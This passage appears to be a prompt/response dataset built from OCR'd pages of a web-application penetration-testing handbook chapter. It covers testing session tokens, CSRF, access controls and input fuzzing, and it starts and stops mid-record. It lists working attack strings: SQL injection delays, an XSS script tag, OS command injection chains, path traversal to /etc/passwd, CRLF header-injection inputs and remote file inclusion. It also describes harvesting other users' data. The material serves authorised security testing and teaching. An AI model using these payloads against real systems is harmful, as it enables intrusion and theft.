of\nthe token, which strongly indicates that some kind of obfuscation or\nencoding is in use. Where the username contains a sequence of the same\ncharacter, look for a corresponding character sequence in the token,\nwhich may indicate the use of XOR obfuscation. Look for sequences in\nthe token that contain only hexadecimal characters, which may indicate\nhexadecimal encoding of an ASCII string or other information. Look for\nsequences ending in an equals sign and/or containing only the other\nvalid Base64 characters: a to z, A to Z, 0 to 9, +, and /.\n5.2.4 If you can identify any meaningful data within your sample of session\ntokens, consider whether this is suffi cient to mount an attack that attempts\nto guess the tokens recently issued to other application users. Find a\npage of the application that is session-dependent, and use the techniques\ncc2211..iinndddd 881155 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.3 Test Tokens for Predictability",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 816\n816 Chapter 21 n A Web Application Hacker’s Methodology\ndescribed in Chapter 14 to automate the task of generating and testing\npossible tokens.\n5.3 Test Tokens for Predictability\n5.3.1 Generate and capture a large number of session tokens in quick succes-\nsion, using a request that causes the server to return a new token (for\nexample, a successful login request).\n5.3.2 Attempt to identify any patterns within your sample of tokens. In all\ncases you should use Burp Sequencer, as described in Chapter 7, to\nperform detailed statistical tests of the randomness properties of the\napplication’s tokens. Depending on the results, it may also be useful to\nperform the following manual analysis:\nn Apply your understanding of which tokens and subsequences the\napplication actually uses to reidentify users. Ignore any data that is\nnot used in this way, even if it varies between samples.\nn If it is unclear what type of data is contained in the token, or in any\nindividual component of it, try applying various decodings (for exam-\nple, Base64) to see if any more meaningful data emerges. It may be\nnecessary to apply several decodings in sequence.\nn Try to identify any patterns in the sequences of values contained in\neach decoded token or component. Calculate the differences between\nsuccessive values. Even if these appear to be chaotic, there may be a\nfixed set of observed differences, which narrows down the scope of\nany brute-force attack considerably.\nn Obtain a similar sample of tokens after waiting for a few minutes,\nand repeat the same analysis. Try to detect whether any of the tokens’\ncontent is time-dependent.\n5.3.3 If you identify any patterns, capture a second sample of tokens using\na different IP address and a different username. This will help you\nidentify whether the same pattern is detected and whether tokens\nreceived in the fi rst exercise could be extrapolated to guess tokens\nreceived in the second.\n5.3.4 If you can identify any exploitable sequences or time dependencies,\nconsider whether this is suffi cient to mount an attack that attempts\nto guess the tokens recently issued to other application users. Use the\ntechniques described in Chapter 14 to automate the task of generating\nand testing possible tokens. Except in the simplest kind of sequences,\nit is likely that your attack will need to involve a customized script\nof some kind.\ncc2211..iinndddd 881166 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.5 Check for Disclosure of Tokens in Logs",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 817\nChapter 21 n A Web Application Hacker’s Methodology 817\n5.3.5 If the session ID appears to be custom-written, use the “bit fl ipper”\npayload source in Burp Intruder to sequentially modify each bit in the\nsession token in turn. Grep for a string in the response that indicates\nwhether modifying the token has not resulted in an invalid session, and\nwhether the session belongs to a different user.\n5.4 Check for Insecure Transmission of Tokens\n5.4.1 Walk through the application as normal, starting with unauthenticated\ncontent at the start URL, proceeding through the login process, and\nthen going through all the application’s functionality. Make a note\nof every occasion on which a new session token is issued, and which\nportions of your communications use HTTP and which use HTTPS.\nYou can use the logging function of your intercepting proxy to record\nthis information.\n5.4.2 If HTTP cookies are being used as the transmission mechanism for ses-\nsion tokens, verify whether the secure fl ag is set, preventing them from\never being transmitted over HTTP connections.\n5.4.3 Determine whether, in the normal use of the application, session tokens\nare ever transmitted over an HTTP connection. If so, they are vulnerable\nto interception.\n5.4.4 In cases where the application uses HTTP for unauthenticated areas\nand switches to HTTPS for the login and/or authenticated areas of\nthe application, verify whether a new token is issued for the HTTPS\nportion of the communications, or whether a token issued during the\nHTTP stage remains active when the application switches to HTTPS.\nIf a token issued during the HTTP stage remains active, the token is\nvulnerable to interception.\n5.4.5 If the HTTPS area of the application contains any links to HTTP URLs,\nfollow these and verify whether the session token is submitted. If it is,\ndetermine whether it continues to be valid or is immediately terminated\nby the server.\n5.5 Check for Disclosure of Tokens in Logs\n5.5.1 If your application mapping exercises identifi ed any logging, monitoring,\nor diagnostic functionality, review these functions closely to determine\nwhether any session tokens are disclosed within them. Confi rm who is\nnormally authorized to access these functions. If they are intended for\nadministrators only, determine whether any other vulnerabilities exist\nthat could enable a lower-privileged user to access them.\ncc2211..iinndddd 881177 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.7 Test Session Termination",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 818\n818 Chapter 21 n A Web Application Hacker’s Methodology\n5.5.2 Identify any instances where session tokens are transmitted within the\nURL. It may be that tokens are generally transmitted in a more secure\nmanner, but that developers have used the URL in specifi c cases to\nwork around a particular problem. If so, these may be transmitted in\ntheReferer header when users follow any off-site links. Check for any\nfunctionality that enables you to inject arbitrary off-site links into pages\nviewed by other users.\n5.5.3 If you fi nd any way to gather valid session tokens issued to other users,\nlook for a way to test each token to determine whether it belongs to an\nadministrative user (for example, by attempting to access a privileged\nfunction using the token).\n5.6 Check Mapping of Tokens to Sessions\n5.6.1 Log in to the application twice using the same user account, either from\ndifferent browser processes or from different computers. Determine\nwhether both sessions remain active concurrently. If they do, the appli-\ncation supports concurrent sessions, enabling an attacker who has\ncompromised another user’s credentials to use these without risk of\ndetection.\n5.6.2 Log in and log out several times using the same user account, either from\ndifferent browser processes or from different computers. Determine\nwhether a new session token is issued each time, or whether the same\ntoken is issued every time the same account logs in. If the latter occurs,\nthe application is not really employing proper session tokens, but is\nusing unique persistent strings to reidentify each user. In this situation,\nthere is no way to protect against concurrent logins or properly enforce\nsession timeout.\n5.6.3 If tokens appear to contain any structure and meaning, attempt to separate\nout components that may identify the user from those that appear to be\ninscrutable. Try to modify any user-related components of the token so\nthat they refer to other known users of the application. Verify whether\nthe application accepts the resulting token and whether it enables you\nto masquerade as that user. See Chapter 7 for examples of this kind of\nsubtle vulnerability.\n5.7 Test Session Termination\n5.7.1 When testing for session timeout and logout fl aws, focus solely on the\nserver’s handling of sessions and tokens, rather than any events that occur\non the client. In terms of session termination, nothing much depends on\nwhat happens to the token within the client browser.\ncc2211..iinndddd 881188 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.8 Check for Session Fixation",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 819\nChapter 21 n A Web Application Hacker’s Methodology 819\n5.7.2 Check whether session expiration is implemented on the server:\nn Log in to the application to obtain a valid session token.\nn Wait for a period without using this token, and then submit a request\nfor a protected page (such as My Details) using the token.\nn If the page is displayed normally, the token is still active.\nn Use trial and error to determine how long any session expiration\ntimeout is, or whether a token can still be used days after the previous\nrequest that used it. Burp Intruder can be configured to increment\nthe time interval between successive requests to automate this task.\n5.7.3 Check whether a logout function exists. If it does, test whether it effec-\ntively invalidates the user’s session on the server. After logging out,\nattempt to reuse the old token, and determine whether it is still valid by\nrequesting a protected page using the token. If the session is still active,\nusers remain vulnerable to some session hijacking attacks even after\nthey have “logged out.” You can use Burp Repeater to keep sending a\nspecifi c request from the proxy history to see whether the application\nresponds differently after you log out.\n5.8 Check for Session Fixation\n5.8.1 If the application issues session tokens to unauthenticated users, obtain\na token and perform a login. If the application does not issue a fresh\ntoken following a successful login, it is vulnerable to session fi xation.\n5.8.2 Even if the application does not issue session tokens to unauthenticated\nusers, obtain a token by logging in, and then return to the login page. If\nthe application is willing to return this page even though you are already\nauthenticated, submit another login as a different user using the same\ntoken. If the application does not issue a fresh token after the second\nlogin, it is vulnerable to session fi xation.\n5.8.3 Identify the format of session tokens that the application uses. Modify\nyour token to an invented value that is validly formed, and attempt to\nlog in. If the application allows you to create an authenticated session\nusing an invented token, it is vulnerable to session fi xation.\n5.8.4 If the application does not support login, but processes sensitive user\ninformation (such as personal and payment details) and allows this to\nbe displayed after submission (such as on a Verify My Order page),\ncarry out the preceding three tests in relation to the pages displaying\nsensitive data. If a token set during anonymous usage of the application\ncan later be used to retrieve sensitive user information, the application\nis vulnerable to session fi xation.\ncc2211..iinndddd 881199 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.10 Check Cookie Scope",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 820\n820 Chapter 21 n A Web Application Hacker’s Methodology\n5.9 Check for CSRF\n5.9.1 If the application relies solely on HTTP cookies as its method of trans-\nmitting session tokens, it may be vulnerable to cross-site request forgery\nattacks.\n5.9.2 Review the application’s key functionality, and identify the specifi c\nrequests that are used to perform sensitive actions. If an attacker can\nfully determine in advance parameters for any of these requests (that\nis, they do not contain any session tokens, unpredictable data, or other\nsecrets), the application is almost certainly vulnerable.\n5.9.3 Create an HTML page that will issue the desired request without any\nuser interaction. For GET requests, you can place an <img> tag with the\nsrc parameter set to the vulnerable URL. For POST requests, you can\ncreate a form that contains hidden fi elds for all the relevant parameters\nrequired for the attack and that has its target set to the vulnerable\nURL. You can use JavaScript to autosubmit the form as soon as the\npage loads. While logged in to the application, use the same browser\nto load your HTML page. Verify that the desired action is carried out\nwithin the application.\n5.9.4 If the application uses additional tokens within requests in an attempt to\nprevent CSRF attacks, test the robustness of these in the same manner as\nfor session tokens. Also test whether the application is vulnerable to UI\nredress attacks, in order to defeat the anti-CSRF defenses (see Chapter 13\nfor more details).\n5.10 Check Cookie Scope\n5.10.1 If the application uses HTTP cookies to transmit session tokens (or\nany other sensitive data), review the relevant Set-Cookie headers, and\ncheck for any domain or path attributes used to control the scope of the\ncookies.\n5.10.2 If the application explicitly liberalizes its cookies’ scope to a parent\ndomain or parent directory, it may be leaving itself vulnerable to attacks\nvia other web applications that are hosted within the parent domain\nor directory.\n5.10.3 If the application sets its cookies’ domain scope to its own domain\nname (or does not specify a domain attribute), it may still be exposed\nto attacks via any applications hosted on subdomains. This is a conse-\nquence of how cookie scoping works. It cannot be avoided other than\nby not hosting any other applications on a subdomain of a security-\nsensitive application.\ncc2211..iinndddd 882200 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "6.1 Understand the Access Control Requirements",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 821\nChapter 21 n A Web Application Hacker’s Methodology 821\n5.10.4 Determine any reliance on segregation by path, such as /site/main and\n/site/demo, which can be subverted in the event of a cross-site scripting\nattack.\n5.10.5 Identify all the possible domain names and paths that will receive the\ncookies that the application issues. Establish whether any other web\napplications are accessible via these domain names or paths that you\nmay be able to leverage to capture the cookies issued to users of the\ntarget application.\n6 Test Access Controls\n6.4. Test for\n6.1. Understand the requirements\ninsecure methods\n6.2. Test with 6.3. Test with\nmultiple accounts limited access\nFigure 21-7: Testing access controls\n6.1 Understand the Access Control Requirements\n6.1.1 Based on the core functionality implemented within the application,\nunderstand the broad requirements for access control in terms of verti-\ncal segregation (different levels of users have access to different types\nof functionality) and horizontal segregation (users at the same privilege\nlevel have access to different subsets of data). Often, both types of seg-\nregation are present. For example, ordinary users may be able to access\ntheir own data, while administrators can access everyone’s data.\n6.1.2 Review your application mapping results to identify the areas of func-\ntionality and types of data resources that represent the most fruitful\ntargets for privilege escalation attacks.\n6.1.3 To perform the most effective testing for access control vulnerabilities,\nyou should ideally obtain a number of different accounts with different\nvertical and horizontal privileges. If self-registration is possible, you can\nprobably obtain the latter directly from the application. To obtain the\nformer, you will probably need the cooperation of the application owner\n(or need to exploit some vulnerability to gain access to a high-privileged\naccount). The availability of different kinds of accounts will affect the\ntypes of testing you can perform, as described next.\ncc2211..iinndddd 882211 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "6.3 Test with Limited Access",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 822\n822 Chapter 21 n A Web Application Hacker’s Methodology\n6.2 Test with Multiple Accounts\n6.2.1 If the application enforces vertical privilege segregation, fi rst use a\npowerful account to locate all the functionality it can access. Then\nuse a less-privileged account and attempt to access each item of this\nfunctionality.\n6.2.1.1 Using Burp, browse all the application’s content within one user\ncontext.\n6.2.1.2 Review the contents of Burp’s site map to ensure you have\nidentifi ed all the functionality you want to test. Then, log out\nof the application and log back in using a different user context.\nUse the context menu to select the “compare site maps” feature\nto determine which high-privileged requests may be accessible to\nthe lower-privileged user. See Chapter 8 for more details on\nthis technique.\n6.2.2 If the application enforces horizontal privilege segregation, perform\nthe equivalent test using two different accounts at the same privilege\nlevel, attempting to use one account to access data belonging to the\nother account. This typically involves replacing an identifi er (such as\na document ID) within a request to specify a resource belonging to the\nother user.\n6.2.3 Perform manual checking of key access control logic.\n6.2.3.1 For each user privilege, review resources available to a user.\nAttempt to access those resources from an unauthorized user\naccount by replaying the request using the unauthorized user’s\nsession token.\n6.2.4 When you perform any kind of access control test, be sure to test every step\nof multistage functions individually to confi rm whether access controls\nhave been properly implemented at each stage, or whether the application\nassumes that users who access a later stage must have passed security\nchecks implemented at the earlier stages. For example, if an administrative\npage containing a form is properly protected, check whether the actual\nform submission is also subjected to proper access controls.\n6.3 Test with Limited Access\n6.3.1 If you do not have prior access to accounts at different privilege levels, or\nto multiple accounts with access to different data, testing for broken access\ncontrols is not quite as straightforward. Many common vulnerabilities will\nbe much harder to locate, because you do not know the names of the URLs,\nidentifi ers, and parameters that are needed to exploit the weaknesses.\ncc2211..iinndddd 882222 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "6.4 Test for Insecure Access Control Methods",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 823\nChapter 21 n A Web Application Hacker’s Methodology 823\n6.3.2 In your application mapping exercises that use a low-privileged account,\nyou may have identifi ed the URLs for privileged functions such as\nadministrative interfaces. If these are not adequately protected, you will\nprobably already know about this.\n6.3.3 Decompile all compiled clients that are present, and extract any refer-\nences to server-side functionality.\n6.3.4 Most data that is subject to horizontal access controls is accessed using\nan identifi er, such as an account number or order reference. To test\nwhether access controls are effective using only a single account, you\nmust try to guess or discover the identifi ers associated with other users’\ndata. If possible, generate a series of identifi ers in quick succession\n(for example, by creating several new orders). Attempt to identify any\npatterns that may enable you to predict the identifi ers issued to other\nusers. If there is no way to generate new identifi ers, you are probably\nrestricted to analyzing those you already have and guessing on that\nbasis.\n6.3.5 If you fi nd a way to predict the identifi ers issued to other users, use the\ntechniques described in Chapter 14 to mount an automated attack to\nharvest interesting data belonging to other users. Use the Extract Grep\nfunction in Burp Intruder to capture the relevant information from within\nthe application’s responses.\n6.4 Test for Insecure Access Control Methods\n6.4.1 Some applications implement access controls based on request\nparameters in an inherently unsafe way. Look for parameters such\nasedit=false or access=read in any key requests, and modify these\nin line with their apparent role to try to interfere with the application’s\naccess control logic.\n6.4.2 Some applications base access control decisions on the HTTP Referer\nheader. For example, an application may properly control access to\n/admin.jsp and accept any request showing this as its Referer. To test\nfor this behavior, attempt to perform some privileged actions to which\nyou are authorized, and submit a missing or modifi ed Referer header.\nIf this change causes the application to block your request, it may be\nusing the Referer header in an unsafe way. Try performing the same\naction as an unauthorized user, but supply the original Referer header\nand see whether the action succeeds.\n6.4.3 If HEAD is an allowed method on the site, test for insecure container-\nmanaged access control to URLs. Make a request using the HEAD method\nto determine whether the application permits it.\ncc2211..iinndddd 882233 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "7.1 Fuzz All Request Parameters",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 824\n824 Chapter 21 n A Web Application Hacker’s Methodology\n7 Test for Input-Based Vulnerabilities\nMany important categories of vulnerabilities are triggered by unexpected user\ninput and can appear anywhere within the application. An effective way to\nprobe the application for these vulnerabilities is to fuzz every parameter to\nevery request with a set of attack strings.\n7.1. Fuzz all request parameters\n7.3. XSS and 7.4. OS\n7.2. SQL 7.5. Path 7.6. Script 7.7. File\nresponse command\ninjection traversal injection inclusion\ninjection injection\nFigure 21-8: Testing for input-based vulnerabilities\n7.1 Fuzz All Request Parameters\n7.1.1 Review the results of your application mapping exercises and identify\nevery distinct client request that submits parameters that the server-side\napplication processes. Relevant parameters include items within the URL\nquery string, parameters in the request body, and HTTP cookies. Also\ninclude any other items of user input that have been observed to have an\neffect on the application’s behavior, such as the Referer or User-Agent\nheaders.\n7.1.2 To fuzz the parameters, you can use your own scripts or a ready-made\nfuzzing tool. For example, to use Burp Intruder, load each request in\nturn into the tool. An easy way to do this is to intercept a request in Burp\nProxy and select the Send to Intruder action, or right-click an item in the\nBurp Proxy history and select this option. Using this option confi gures\nBurp Intruder with the contents of the request, along with the correct\ntarget host and port. It also automatically marks the values of all request\nparameters as payload positions, ready for fuzzing.\n7.1.3 Using the payloads tab, confi gure a suitable set of attack payloads to\nprobe for vulnerabilities within the application. You can enter payloads\nmanually, load them from a fi le, or select one of the preset payload lists.\nFuzzing every request parameter within the application typically entails\nissuing a large number of requests and reviewing the results for anomalies.\nIf your set of attack strings is too large, this can be counterproductive\ncc2211..iinndddd 882244 88//1199//22001111 1122::2222::0044 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 825\nChapter 21 n A Web Application Hacker’s Methodology 825\nand generate a prohibitively large amount of output for you to review.\nHence, a sensible approach is to target a range of common vulnerabili-\nties that can often be easily detected in anomalous responses to specifi c\ncrafted inputs and that often manifest themselves anywhere within\nthe application rather than within specifi c types of functionality. Here\nis a suitable set of payloads that you can use to test for some common\ncategories of vulnerabilities:\nSQL Injection\n‘\n‘--\n‘; waitfor delay ‘0:30:0’--\n1; waitfor delay ‘0:30:0’--\nXSS and Header Injection\nxsstest\n“><script>alert(‘xss’)</script>\nOS Command Injection\n|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &\n| ping –i 30 127.0.0.1 |\n| ping –n 30 127.0.0.1 |\n& ping –i 30 127.0.0.1 &\n& ping –n 30 127.0.0.1 &\n; ping 127.0.0.1 ;\n%0a ping –i 30 127.0.0.1 %0a\n` ping 127.0.0.1 `\nPath Traversal\n../../../../../../../../../../etc/passwd\n../../../../../../../../../../boot.ini\n..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd\n..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini\nScript Injection\n;echo 111111\necho 111111\nresponse.write 111111\n:response.write 111111\nFile Inclusion\nhttp://<your server name>/\nhttp://<nonexistent IP address>/\n7.1.4 All the preceding payloads are shown in their literal form. The characters\n?,;,&,+,=, and space need to be URL-encoded because they have special\ncc2211..iinndddd 882255 88//1199//22001111 1122::2222::0044 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 826\n826 Chapter 21 n A Web Application Hacker’s Methodology\nmeaning within HTTP requests. By default, Burp Intruder performs the\nnecessary encoding of these characters, so ensure that this option has not\nbeen disabled. (To restore all options to their defaults following earlier\ncustomization, select Burp ‚ Restore Defaults.)\n7.1.5 In the Grep function of Burp Intruder, confi gure a suitable set of strings\nto fl ag some common error messages within responses. For example:\nerror\nexception\nillegal\ninvalid\nfail\nstack\naccess\ndirectory\nfile\nnot found\nvarchar\nODBC\nSQL\nSELECT\n111111\nNote that the string 111111 is included to test for successful script injec-\ntion attacks. The payloads in step 7.1.3 involve writing this value into\nthe server’s response.\n7.1.6 Also select the Payload Grep option to fl ag responses that contain the\npayload itself, indicating a potential XSS or header injection vulnerability.\n7.1.7 Set up a web server or netcat listener on the host you specifi ed in the\nfi rst fi le inclusion payload. This helps you monitor for connection\nattempts received from the server resulting from a successful remote\nfi le inclusion attack.\n7.1.8 Launch the attack. When it has completed, review the results for anoma-\nlous responses indicating the presence of vulnerabilities. Check for\ndivergences in the HTTP status code, the response length, the response\ntime, the appearance of your confi gured expressions, and the appearance\nof the payload itself. You can click each column heading in the results\ntable to sort the results by the values in that column (and Shift-click\nto reverse-sort the results). This enables you to quickly identify any\nanomalies that stand out from the other results.\n7.1.9 For each potential vulnerability indicated by the results of your fuzz test-\ning, refer to the following sections of this methodology. They describe\nthe detailed steps you should take in relation to each category of problem\nto verify the existence of a vulnerability and successfully exploit it.\ncc2211..iinndddd 882266 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "7.2 Test for SQL Injection",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 827\nChapter 21 n A Web Application Hacker’s Methodology 827\n7.1.10 After you have confi gured Burp Intruder to perform a fuzz test of a single\nrequest, you can quickly repeat the same test on other requests within\nthe application. Simply select each target request within Burp Proxy and\nchoose the Send to Intruder option. Then immediately launch the attack\nwithin Intruder using the existing attack confi guration. In this way, you\ncan launch a large number of tests simultaneously in separate windows\nand manually review the results as each test completes its work.\n7.1.11 If your mapping exercises identifi ed any out-of-band input channels\nwhereby user-controllable input can be introduced into the application’s\nprocessing, you should perform a similar fuzzing exercise on these input\nchannels. Submit various crafted data designed to trigger common vul-\nnerabilities when processed within the web application. Depending on\nthe nature of the input channel, you may need to create a custom script\nor other harness for this purpose.\n7.1.12 In addition to your own fuzzing of application requests, if you have access\nto an automated web application vulnerability scanner, you should run\nit against the target application to provide a basis for comparison with\nyour own fi ndings.\n7.2 Test for SQL Injection\n7.2.1 If the SQL attack strings listed in step 7.1.3 result in any anomalous\nresponses, probe the application’s handling of the relevant parameter\nmanually to determine whether a SQL injection vulnerability is present.\n7.2.2 If any database error messages were returned, investigate their meaning.\nUse the section “SQL Syntax and Error Reference” in Chapter 9 to help\ninterpret error messages on some common database platforms.\n7.2.3 If submitting a single quotation mark in the parameter causes an error\nor other anomalous behavior, submit two single quotation marks. If this\ninput causes the error or anomalous behavior to disappear, the applica-\ntion is probably vulnerable to SQL injection.\n7.2.4 Try using common SQL string concatenator functions to construct a string\nthat is equivalent to some benign input. If this causes the same response\nas the original benign input, the application is probably vulnerable. For\nexample, if the original input is the expression FOO, you can perform\nthis test using the following items (in the third example, note the space\nbetween the two quotes):\n‘||’FOO\n‘+’FOO\n‘ ‘FOO\ncc2211..iinndddd 882277 88//1199//22001111 1122::2222::0044 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 828\n828 Chapter 21 n A Web Application Hacker’s Methodology\nAs always, be sure to URL-encode characters such as + and space that\nhave special meaning within HTTP requests.\n7.2.5 If the original input is numeric, try using a mathematical expression that\nis equivalent to the original value. For example, if the original value was\n2, try submitting 1+1 or 3–1. If the application responds in the same way,\nit may be vulnerable, particularly if the value of the numeric expression\nhas a systematic effect on the application’s behavior.\n7.2.6 If the preceding test is successful, you can gain further assurance that\na SQL injection vulnerability is involved by using SQL-specifi c math-\nematical expressions to construct a particular value. If the application’s\nlogic can be systematically manipulated in this way, it is almost certainly\nvulnerable to SQL injection. For example, both of the following items\nare equivalent to the number 2:\n67-ASCII(‘A’)\n51-ASCII(1)\n7.2.7 If either of the fuzz test cases using the waitfor command resulted\nin an abnormal time delay before the application responded, this is a\nstrong indicator that the database type is MS-SQL and the application\nis vulnerable to SQL injection. Repeat the test manually, specifying dif-\nferent values in the waitfor parameter, and determine whether the time\ntaken to respond varies systematically with this value. Note that your\nattack payload may be inserted into more than one SQL query, so the\ntime delay observed may be a fi xed multiple of the value specifi ed.\n7.2.8 If the application is vulnerable to SQL injection, consider what kinds\nof attacks are feasible and likely to help you achieve your objectives.\nRefer to Chapter 9 for the detailed steps needed to carry out any of the\nfollowing attacks:\nn Modify the conditions within a WHERE clause to change the applica-\ntion’s logic (for example, by injecting or 1=1-- to bypass a login).\nn Use the UNION operator to inject an arbitrary SELECT query and combine\nthe results with those of the application’s original query.\nn Fingerprint the database type using database-specific SQL syntax.\nn If the database type is MS-SQL and the application returns ODBC error\nmessages in its responses, leverage these to enumerate the database\nstructure and retrieve arbitrary data.\nn If you cannot find a way to directly retrieve the results of an arbitrary\ninjected query, use the following advanced techniques to extract data:\nn Retrieve string data in numeric form, one byte at a time.\nn Use an out-of-band channel.\ncc2211..iinndddd 882288 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "7.3 Test for XSS and Other Response Injection",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 829\nChapter 21 n A Web Application Hacker’s Methodology 829\nn If you can cause different application responses based on a single\narbitrary condition, use Absinthe to extract arbitrary data one bit\nat a time.\nn If you can trigger time delays based on a single arbitrary condition,\nexploit these to retrieve data one bit at a time.\nn If the application is blocking certain characters or expressions that\nyou require to perform a particular attack, try the various bypass\ntechniques described in Chapter 9 to circumvent the input filter.\nn If possible, escalate the attack against the database and the underly-\ning server by leveraging any vulnerabilities or powerful functions\nwithin the database.\n7.3 Test for XSS and Other Response Injection\n7.3.1 Identify Refl ected Request Parameters\n7.3.1.1 Sort the results of your fuzz testing by clicking the Payload Grep column,\nand identify any matches corresponding to the XSS payloads listed in\nstep 7.1.3. These are cases where the XSS test strings were returned\nunmodifi ed within the application’s responses.\n7.3.1.2 For each of these cases, review the application’s response to fi nd the loca-\ntion of the supplied input. If this appears within the response body, test\nfor XSS vulnerabilities. If the input appears within any HTTP header, test\nfor header injection vulnerabilities. If it is used in the Location header\nof a 302 response, or if it is used to specify a redirect in some other way,\ntest for redirection vulnerabilities. Note that the same input might be\ncopied into multiple locations within the response, and that more than\none type of refl ected vulnerability might be present.\n7.3.2 Test for Refl ected XSS\n7.3.2.1 For each place within the response body where the value of the request\nparameter appears, review the surrounding HTML to identify possible\nways of crafting your input to cause execution of arbitrary JavaScript.\nFor example, you can inject <script> tags, inject into an existing script,\nor place a crafted value into a tag attribute.\n7.3.2.2 Use the different methods of beating signature-based fi lters described in\nChapter 12 as a reference for the different ways in which crafted input\ncan be used to cause execution of JavaScript.\n7.3.2.3 Try submitting various possible exploits to the application, and monitor\nits responses to determine whether any fi ltering or sanitization of input\ncc2211..iinndddd 882299 88//1199//22001111 1122::2222::0044 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 830\n830 Chapter 21 n A Web Application Hacker’s Methodology\nis being performed. If your attack string is returned unmodifi ed, use a\nbrowser to verify conclusively that you have succeeded in executing\narbitrary JavaScript (for example, by generating an alert dialog).\n7.3.2.4 If you fi nd that the application is blocking input containing certain\ncharacters or expressions you need to use, or is HTML-encoding certain\ncharacters, try the various fi lter bypasses described in Chapter 12.\n7.3.2.5 If you fi nd an XSS vulnerability in a POST request, this can still be\nexploited via a malicious website that contains a form with the required\nparameters and a script to automatically submit the form. Nevertheless,\na wider range of attack delivery mechanisms is available if the exploit\ncan be delivered via a GET request. Try submitting the same parameters\nin a GET request, and see if the attack still succeeds. You can use the\nChange Request Method action in Burp Proxy to convert the request\nfor you.\n7.3.3 Test for HTTP Header Injection\n7.3.3.1 For each place within the response headers where the value of the request\nparameter appears, verify whether the application accepts data contain-\ning URL-encoded carriage-return (%0d) and line-feed (%0a) characters\nand whether these are returned unsanitized in its response. (Note that\nyou are looking for the actual newline characters themselves to appear\nin the server’s response, not their URL-encoded equivalents.)\n7.3.3.2 If a new line appears in the server’s response headers when you sup-\nply crafted input, the application is vulnerable to HTTP header injec-\ntion. This can be leveraged to perform various attacks, as described in\nChapter 13.\n7.3.3.3 If you fi nd that only one of the two newline characters gets returned in\nthe server’s responses, it may still be possible to craft a working exploit,\ndepending on the context and the target user’s browser.\n7.3.3.4 If you fi nd that the application blocks input containing newline charac-\nters, or sanitizes those characters in its response, try the following items\nof input to test the fi lter’s effectiveness:\nfoo%00%0d%0abar\nfoo%250d%250abar\nfoo%%0d0d%%0a0abar\n7.3.4 Test for Open Redirection\n7.3.4.1 If the refl ected input is used to specify the target of a redirect of some\nkind, test whether it is possible to supply crafted input that results in\ncc2211..iinndddd 883300 88//1199//22001111 1122::2222::0044 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 831\nChapter 21 n A Web Application Hacker’s Methodology 831\nan arbitrary redirect to an external website. If so, this behavior can be\nexploited to lend credibility to a phishing-style attack.\n7.3.4.2 If the application ordinarily transmits an absolute URL as the parameter’s\nvalue, modify the domain name within the URL, and test whether the\napplication redirects you to the different domain.\n7.3.4.3 If the parameter normally contains a relative URL, modify this into an\nabsolute URL for a different domain, and test whether the application\nredirects you to this domain.\n7.3.4.4 If the application carries out some validation on the parameter before\nperforming the redirect, in an effort to prevent external redirection,\nthis is often vulnerable to bypasses. Try the various attacks described\nin Chapter 13 to test the robustness of the fi lters.\n7.3.5 Test for Stored Attacks\n7.3.5.1 If the application stores items of user-supplied input and later displays these\non-screen, after you have fuzzed the entire application you may observe\nsome of your attack strings being returned in responses to requests that did\nnot themselves contain those strings. Note any instances where this occurs,\nand identify the original entry point for the data that is being stored.\n7.3.5.2 In some cases, user-supplied data is stored successfully only if you com-\nplete a multistage process, which does not occur in basic fuzz testing. If\nyour application mapping exercises identifi ed any functionality of this\nkind, manually walk through the relevant process and test the stored\ndata for XSS vulnerabilities.\n7.3.5.3 If you have suffi cient access to test it, review closely any administrative\nfunctionality in which data originating from low-privileged users is\nultimately rendered on-screen in the session of more privileged users.\nAny stored XSS vulnerabilities in functionality of this kind typically lead\ndirectly to privilege escalation.\n7.3.5.4 Test every instance where user-supplied data is stored and displayed\nto users. Probe these for XSS and the other response injection attacks\ndescribed previously.\n7.3.5.5 If you fi nd a vulnerability in which input supplied by one user is displayed\nto other users, determine the most effective attack payload with which\nyou can achieve your objectives, such as session hijacking or request\nforgery. If the stored data is displayed only to the same user from whom\nit originated, try to fi nd ways of chaining any other vulnerabilities you\nhave discovered (such as broken access controls) to inject an attack into\nother users’ sessions.\ncc2211..iinndddd 883311 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "7.4 Test for OS Command Injection",
